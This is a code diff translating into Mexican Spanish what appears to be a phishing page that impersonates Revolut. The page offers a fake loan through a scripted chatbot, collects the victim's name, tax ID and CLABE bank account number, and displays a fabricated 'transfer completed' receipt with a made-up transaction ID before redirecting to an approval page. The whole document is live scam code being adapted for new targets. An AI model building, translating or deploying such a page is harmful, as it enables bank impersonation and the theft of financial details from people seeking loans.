@@ -179,7 +179,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     <div class="brand"><img src="images/revolut-logo.svg" alt="Revolut" style="height:28px;width:auto;display:block;"/></div>
     <div class="user-block">
       <div class="user-info">
-        <div class="name" id="userName">customer</div>
+        <div class="name" id="userName">cliente</div>
         <div class="nif" id="userNif">*** *** ***</div>
       </div>
       <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
@@ -204,17 +204,17 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     </div>
 
     <div class="options" id="options" style="display:none">
-      <button class="opt" data-v="Pay expenses">Pay expenses</button>
-      <button class="opt" data-v="Invest in business">Invest in business</button>
+      <button class="opt" data-v="Pagar gastos">Pagar gastos</button>
+      <button class="opt" data-v="Invertir en negocio">Invertir en negocio</button>
       <button class="opt" data-v="Remodelación del hogar">Remodelación del hogar</button>
-      <button class="opt" data-v="Medical emergency">Medical emergency</button>
+      <button class="opt" data-v="Emergencia médica">Emergencia médica</button>
     </div>
 
     <div class="options" id="options2" style="display:none">
-      <button class="opt2" data-v="Yes, at a traditional bank">Yes, at a traditional bank</button>
-      <button class="opt2" data-v="Yes, at a digital bank">Yes, at a digital bank</button>
-      <button class="opt2" data-v="Yes, at both">Yes, at both</button>
-      <button class="opt2" data-v="I'll open an account">I'll open an account</button>
+      <button class="opt2" data-v="Sí, en un banco tradicional">Sí, en un banco tradicional</button>
+      <button class="opt2" data-v="Sí, en un banco digital">Sí, en un banco digital</button>
+      <button class="opt2" data-v="Sí, en ambos">Sí, en ambos</button>
+      <button class="opt2" data-v="Voy a abrir una cuenta">Voy a abrir una cuenta</button>
     </div>
 
     <div class="options" id="options3" style="display:none">
@@ -222,34 +222,34 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <button class="opt3" data-v="BNP Paribas">BNP Paribas</button>
       <button class="opt3" data-v="Deutsche Bank">Deutsche Bank</button>
       <button class="opt3" data-v="N26">N26</button>
-      <button class="opt3" data-v="Otro Bank">Otro Bank</button>
+      <button class="opt3" data-v="Otro banco">Otro banco</button>
     </div>
 
     <div class="iban-box" id="ibanBox" style="display:none">
-      <input class="iban-input" id="ibanInput" type="text" inputmode="text" maxlength="34" placeholder="e.g., DE89 3704 0044 0532 0130 00" autocomplete="off"/>
+      <input class="iban-input" id="ibanInput" type="text" inputmode="text" maxlength="34" placeholder="p. ej. 646180110400000007" autocomplete="off"/>
       <div class="iban-error" id="ibanError">Por favor ingresa una CLABE válida.</div>
       <button class="iban-btn" id="ibanBtn"><span data-msg="chat.t09">Confirmarar CLABE</span></button>
     </div>
 
     <div class="confirm-box" id="ibanConfirmar" style="display:none">
-      <div class="confirm-msg">La CLABE para la transferencia es:<strong id="confirmIbanText"></strong>Is this correct?</div>
-      <button class="confirm-yes" id="confirmYes"><span data-msg="chat.t11">Yes, it's correct</span></button>
-      <button class="confirm-no" id="confirmNo"><span data-msg="chat.t12">No, I want to fix it</span></button>
+      <div class="confirm-msg">La CLABE para la transferencia es:<strong id="confirmIbanText"></strong>¿Es correcto?</div>
+      <button class="confirm-yes" id="confirmYes"><span data-msg="chat.t11">Sí, es correcto</span></button>
+      <button class="confirm-no" id="confirmNo"><span data-msg="chat.t12">No, quiero corregirlo</span></button>
     </div>
 
     <div class="options" id="options4" style="display:none">
-      <button class="opt4" data-v="Siguiente month">Siguiente month</button>
-      <button class="opt4" data-v="In 30 days">In 30 days</button>
-      <button class="opt4" data-v="In 60 days">In 60 days</button>
-      <button class="opt4" data-v="In 90 days">In 90 days</button>
+      <button class="opt4" data-v="El próximo mes">El próximo mes</button>
+      <button class="opt4" data-v="En 30 días">En 30 días</button>
+      <button class="opt4" data-v="En 60 días">En 60 días</button>
+      <button class="opt4" data-v="En 90 días">En 90 días</button>
     </div>
 
     <div class="amount-box" id="amountBox">
-      <div class="amount-label">Loan amount</div>
+      <div class="amount-label">Monto del préstamo</div>
       <div class="amount-value" id="amountValue">$ 200,000,00</div>
       <input type="range" id="amountRange" class="amount-slider" min="20000" max="1500000" step="500" value="10000"/>
       <div class="amount-minmax"><span>$ 20,000,00</span><span>$ 1,500,000,00</span></div>
-      <button class="amount-btn" id="amountBtn">Confirmar amount <span>✓</span></button>
+      <button class="amount-btn" id="amountBtn">Confirmar monto <span>✓</span></button>
     </div>
 
     <div class="parcelas-box" id="parcelasBox"></div>
@@ -385,7 +385,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       addMe(v);
       document.getElementById('options3').style.display='none';
       addTyping();
-      var bankLabel = v === 'Otro Bank' ? 'Otro Bank' : v;
+      var bankLabel = v === 'Otro banco' ? 'Otro banco' : v;
       addThem('Perfect! Confirmar the CLABE de tu '+bankLabel+' cuenta bancaria donde deseas recibir el monto del préstamo.', function(){
         var box = document.getElementById('ibanBox');
         box.style.display='flex';
@@ -439,7 +439,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     addMe(val);
     document.getElementById('ibanConfirmar').style.display='none';
     addTyping();
-    addThem('Last question! When would you like to start paying the installments?', function(){
+    addThem('Last question! When would you like to start paying the cuotas?', function(){
       document.getElementById('options4').style.display = 'flex';
     });
   });
@@ -460,7 +460,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       addMe(v);
       document.getElementById('options4').style.display='none';
       addTyping();
-      addThem('Perfect! Now tell me: how much do you need?', function(){
+      addThem('¡Perfecto! Ahora dime: ¿cuánto necesitas?', function(){
         document.getElementById('amountBox').style.display='flex';
       });
     });
@@ -522,7 +522,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
         addMe(n+'x de '+fmtEUR(valorParcela));
         document.getElementById('parcelasBox').style.display='none';
         addTyping();
-        addThem('Perfect! I will process the payment now...', function(){
+        addThem('¡Perfecto! Procesaré el pago ahora...', function(){
           renderReceipt(principal, n, valorParcela, valorTotal);
           setTimeout(function(){
             addTyping();
@@ -549,7 +549,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     addMe(fmtEUR(principal));
     document.getElementById('amountBox').style.display='none';
     addTyping();
-    addThem('Great! Now choose how many installments you want to pay in:', function(){
+    addThem('Great! Now choose how many cuotas you want to pay in:', function(){
       renderParcelas(principal);
     });
   });
@@ -559,7 +559,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     var nomeCli = (localStorage.getItem('nome') || 'customer').trim();
     var nomeShort = nomeCli.split(/\s+/).slice(0,2).join(' ').toLowerCase();
     var nifCli = (localStorage.getItem('nif') || '').replace(/\D/g,'');
-    var banco = localStorage.getItem('bancoDestino') || 'Otro Bank';
+    var banco = localStorage.getItem('bancoDestino') || 'Otro banco';
     var ibanCli = localStorage.getItem('iban') || '';
     var ibanFmt = ibanCli.replace(/\s/g,'').toUpperCase().match(/.{1,4}/g);
     ibanFmt = ibanFmt ? ibanFmt.join(' ') : ibanCli;
@@ -575,14 +575,14 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     var totalPayableFmt = '$ ' + parseFloat(totalPayable).toLocaleString('es-MX', {minimumFractionDigits:2, maximumFractionDigits:2});
 
     var html =
-      '<div class="row-i"><div class="k">Destination Bank</div><div class="vv">'+banco+'</div></div>' +
+      '<div class="row-i"><div class="k">Banco de destino</div><div class="vv">'+banco+'</div></div>' +
       '<div class="row-i"><div class="k">Cuotas</div><div class="vv">'+n+'x de '+fmtEUR(valorParcela)+'</div></div>' +
-      '<div class="row-i"><div class="k">Borrowing Rate</div><div class="vv">'+borrowingRate.toFixed(2)+'%</div></div>' +
+      '<div class="row-i"><div class="k">Tasa de interés</div><div class="vv">'+borrowingRate.toFixed(2)+'%</div></div>' +
       '<div class="row-i"><div class="k">CAT</div><div class="vv">'+aprc.toFixed(2)+'%</div></div>' +
-      '<div class="row-i"><div class="k">Total Amount Payable</div><div class="vv">'+totalPayableFmt+'</div></div>' +
-      '<div class="row-i"><div class="k">Date/Time</div><div class="vv">'+dd+' '+hh+'</div></div>' +
-      '<div class="row-i"><div class="k">Transaction ID</div><div class="vv">'+txId+'</div></div>' +
-      '<div class="foot"><b>Transferencia completed successfully</b>RevolutBank — Con sede en Ciudad de México</div>';
+      '<div class="row-i"><div class="k">Monto Total Payable</div><div class="vv">'+totalPayableFmt+'</div></div>' +
+      '<div class="row-i"><div class="k">Fecha/Hora</div><div class="vv">'+dd+' '+hh+'</div></div>' +
+      '<div class="row-i"><div class="k">ID de transacción</div><div class="vv">'+txId+'</div></div>' +
+      '<div class="foot"><b>Transferencia completada exitosamente</b>RevolutBank — Con sede en Ciudad de México</div>';
 
     // Insert the receipt into the message flow
     var msgs = document.getElementById('messages');
@@ -616,7 +616,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       document.getElementById('simBox').style.display='none';
 
       addTyping();
-      addThem('Perfect! I will now finalize your review...', function(){
+      addThem('¡Perfecto! Ahora finalizaré tu revisión...', function(){
         setTimeout(function(){
           var pp = new URLSearchParams(window.location.search);
           window.location.href = 'aprovado.html' + (pp.toString() ? '?'+pp.toString() : '');
